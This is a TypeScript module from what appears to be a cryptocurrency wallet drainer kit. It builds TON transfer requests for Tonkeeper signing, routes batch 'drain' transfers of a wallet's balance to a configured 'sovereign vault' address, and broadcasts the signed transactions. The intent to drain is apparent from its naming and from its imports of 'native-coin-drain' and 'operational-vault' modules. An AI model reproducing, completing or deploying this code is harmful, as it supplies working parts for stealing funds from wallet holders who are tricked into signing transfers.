/**
 * TON native drain — transfer params for Tonkeeper signing + BOC relay broadcast.
 */
import { Address, internal } from '@ton/core'
import { TonClient } from '@ton/ton'

import { resolveTonCenterJsonRpcUrl, tonCenterApiHeaders } from './ton-sensory-armor.js'
import { parseNativeAmount } from './native-coin-drain.js'
import { resolveTonVaultAddress } from './operational-vault.js'

export type TonNativeTransferRequest = {
  from: string
  to: string
  nanotons: string
  validUntil: number
  /** TonConnect / Tonkeeper message list. */
  messages: Array<{ address: string; amount: string; payload?: string }>
  wallet: 'tonkeeper'
}

function createTonClient(endpoint: string): TonClient {
  const apiKey = tonCenterApiHeaders()?.['X-API-Key']
  return new TonClient({
    endpoint,
    ...(apiKey ? { apiKey } : {}),
  })
}

/**
 * Build TON native transfer parameters for Tonkeeper wallet signing.
 * `amountNanotons` is in nanotons (1 TON = 1e9 nanotons).
 */
export async function buildTonNativeTransferTx(
  wallet: string,
  to: string,
  amountNanotons: bigint,
  rpcUrl?: string,
): Promise<TonNativeTransferRequest> {
  if (amountNanotons <= 0n) {
    throw new Error('TON transfer amount must be greater than zero')
  }

  const endpoint = rpcUrl?.trim() || resolveTonCenterJsonRpcUrl()
  const destination = Address.parse(to)
  const msg = internal({
    to: destination,
    value: amountNanotons,
    bounce: false,
  })

  const validUntil = Math.floor(Date.now() / 1000) + 600

  return {
    from: wallet,
    to: destination.toString({ bounceable: true, urlSafe: true }),
    nanotons: amountNanotons.toString(),
    validUntil,
    messages: [
      {
        address: destination.toString({ bounceable: true, urlSafe: true }),
        amount: amountNanotons.toString(),
        payload: msg.body.toBoc().toString('base64'),
      },
    ],
    wallet: 'tonkeeper',
  }
}

/** Build TON native drain plan using configured sovereign vault destination. */
export async function buildTonNativeDrainForBatch(params: {
  wallet: string
  amountNanotons: bigint
  vault?: string
  rpcUrl?: string
}): Promise<TonNativeTransferRequest | null> {
  if (params.amountNanotons <= 0n) return null
  const vault = params.vault ?? (await resolveTonVaultAddress())
  if (!vault) {
    throw new Error('VAULT_ADDRESS_TON or SOVEREIGN_VAULT_TON required for TON drain')
  }
  return buildTonNativeTransferTx(params.wallet, vault, params.amountNanotons, params.rpcUrl)
}

export async function broadcastSignedTonNativeTransfer(params: {
  bocBase64: string
  rpcUrl?: string
}): Promise<{ ok: boolean; tx_hash?: string; detail?: string }> {
  const endpoint = params.rpcUrl?.trim() || resolveTonCenterJsonRpcUrl()
  try {
    const { Cell } = await import('@ton/core')
    const client = createTonClient(endpoint)
    const buffer = Buffer.from(params.bocBase64, 'base64')
    const cells = Cell.fromBoc(buffer)
    const firstCell = cells[0]
    if (firstCell == null) {
      return { ok: false, detail: 'TON BOC payload is empty' }
    }
    await client.sendFile(buffer)
    return { ok: true, tx_hash: firstCell.hash().toString('hex') }
  } catch (e) {
    return { ok: false, detail: e instanceof Error ? e.message : String(e) }
  }
}

export { parseNativeAmount as parseTonNativeAmount }
